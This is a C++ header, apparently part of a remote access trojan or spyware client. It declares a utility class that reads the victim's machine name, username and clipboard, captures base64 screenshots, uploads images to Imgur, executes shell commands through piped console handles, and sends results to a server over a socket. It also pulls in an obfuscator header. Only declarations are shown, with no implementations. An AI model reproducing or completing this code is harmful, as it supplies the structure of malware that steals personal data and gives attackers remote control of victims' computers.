#include <winsock2.h>       //Socket Header
#include <windows.h>        //Win API Header
#include <curl/curl.h>
#include <Ws2tcpip.h>
#include <stdio.h>          //Input Output Header
#include <Lmcons.h>
#include <atlimage.h>

#include <iostream>     //Input Output Debug Header
#include <algorithm>
#include <vector>

#include "obfuscator.h"

class Utils {
public:
	static std::string getMachineName();
	static std::string getUsername();
	static std::string getClipboardText();
	static std::string getScreenshotBase64();
	static std::string uploadToImgur(std::string image);
	static std::string executeCommand(std::string command);
	static void sendToServer(SOCKET socket, const char* buffer);

	inline static bool consoleOpen;
	inline static HANDLE hWriteOUT, hReadOUT, hWriteIN, hReadIN;
	inline static DWORD dwWritten, dwRead;
	inline static PROCESS_INFORMATION procInfo;
};